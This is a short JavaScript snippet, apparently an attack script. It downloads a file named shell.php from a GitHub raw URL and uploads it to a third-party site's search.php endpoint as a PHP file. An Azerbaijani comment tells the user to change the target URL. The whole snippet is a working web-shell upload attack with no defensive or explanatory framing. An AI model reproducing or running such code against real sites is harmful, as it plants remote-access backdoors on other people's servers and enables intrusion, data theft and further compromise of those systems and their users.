fetch("https://raw.githubusercontent.com/studentgupgup/testingg/refs/heads/main/shell.php")
  .then(r => r.blob())
  .then(blob => {
    const form = new FormData();
    form.append("file", new File([blob], "shell.php", { type: "application/x-php" }));

    fetch("http://arminfo.info/search.php", { // <<< BURANI DƏYİŞ
      method: "POST",
      body: form
    });
  });
